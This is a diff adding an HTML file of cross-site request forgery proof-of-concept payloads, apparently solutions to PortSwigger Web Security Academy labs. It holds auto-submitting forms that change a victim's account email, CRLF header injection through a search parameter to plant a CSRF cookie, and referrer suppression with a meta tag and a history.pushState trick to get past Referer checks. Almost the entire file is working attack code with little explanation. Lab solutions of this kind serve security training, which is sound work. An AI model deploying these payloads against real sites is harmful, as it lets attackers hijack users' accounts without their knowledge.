@@ -1,0 +1,59 @@
+<img src="https://ac101ff51ed24583801012a600940065.web-security-academy.net//?search=test%0d%0aSet-Cookie:%20csrfKey=Bzl07YUxdFztWiyTfXrgZhAyHjBkgwyG">
+<form action="https://ac101ff51ed24583801012a600940065.web-security-academy.net/email/change-email" method="POST">
+	<input required type="email" name="email" value="">
+	<input required type="hidden" name="csrf" value="FNn8b6LyyqpOPidFxiPn8361yw2erVt7">
+</form>
+<script>
+document.forms[0].submit()
+</script>
+
+
+
+
+
+<form action="https://ac101ff51ed24583801012a600940065.web-security-academy.net/email/change-email" method="POST">
+	<input required type="email" name="email" value="lol@lol.lol">
+	<input required type="hidden" name="csrf" value="FNn8b6LyyqpOPidFxiPn8361yw2erVt7">
+</form>
+<img src="https://ac101ff51ed24583801012a600940065.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=Bzl07YUxdFztWiyTfXrgZhAyHjBkgwyG" onerror="document.forms[0].submit()">
+
+
+
+
+<meta name="referrer" content="never"> 
+<form action="https://ac101ff51ed24583801012a600940065.web-security-academy.net/email/change-email" method="POST">
+	<input required type="email" name="email" value="lol@lol.lol">
+	<input required type="hidden" name="csrf" value="FNn8b6LyyqpOPidFxiPn8361yw2erVt7">
+</form>
+<img src="https://ac101ff51ed24583801012a600940065.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=Bzl07YUxdFztWiyTfXrgZhAyHjBkgwyG" onerror="document.forms[0].submit()">
+
+
+
+
+
+<meta name="referrer" content="never"> 
+<form action="https://ac251f581e13ea9f81313d6b00070085.web-security-academy.net/email/change-email" method="POST">
+	<input required type="email" name="email" value="lol@lol.lol">
+</form>
+<img src="sadf" onerror="document.forms[0].submit()">
+
+
+
+
+Hello, world!
+<form action="https://aca91fb41f0c469380d3455e00060040.web-security-academy.net/email/change-email" method="POST">
+	<input required type="email" name="email" value="lol@lol.lol">
+        <input type="Submit">
+
+</form>
+<script>
+history.pushState("", "", "/aca91fb41f0c469380d3455e00060040.web-security-academy.net");
+
+</script>
+
+
+
+/?search=test
+
+Set-Cookie: csrfKey=your-key
+
